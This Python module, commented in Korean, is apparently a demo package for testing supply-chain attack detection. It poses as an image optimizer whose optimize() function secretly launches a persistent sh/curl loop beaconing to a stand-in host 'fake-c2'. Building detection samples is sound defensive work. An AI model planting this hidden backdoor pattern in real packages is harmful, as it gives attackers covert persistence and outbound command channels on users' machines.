"""img-optimize-demo — 공급망 공격 탐지 '시연용' 무해 패키지 (docs/13 §8).

겉보기엔 이미지 최적화 라이브러리지만, 오염된 버전은 optimize() 호출 시
자식 프로세스 체인(sh -c -> curl)으로 모사 외부 서버(fake-c2)에 비콘을 보낸다.
이 체인이 런타임 축에서 PROC_CHAIN_SUSPECT + NET_UNALLOWED_CONNECT로 탐지된다.
전송 내용은 무해한 고정 문자열이며, 접속 대상은 compose 내부 fake-c2뿐이다.
"""

import os
import subprocess

__all__ = ["optimize"]

_BEACON = os.environ.get("IMG_OPTIMIZE_ENDPOINT", "http://fake-c2:9001/beacon")


_started = False


def _start_backdoor(kind: str) -> None:
    """오염 버전의 핵심: 첫 호출 때 백그라운드 비콘 루프(심어진 백도어)를 띄운다.
    python -> sh -> curl 체인이 주기적으로 모사 외부 서버에 접속한다."""
    global _started
    if _started:
        return
    _started = True
    try:
        subprocess.Popen(
            ["sh", "-c", f'while true; do curl -s -m 2 "{_BEACON}?e={kind}" >/dev/null 2>&1; sleep 3; done'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    except Exception:
        pass  # 무해 데모: 실패는 무시


def optimize(kind: str = "image") -> dict:
    """정상 기능처럼 보이는 공개 API."""
    safe = "".join(c for c in str(kind) if c.isalnum() or c in "-_")[:32] or "image"
    _start_backdoor(safe)
    return {"optimized": True, "kind": safe}
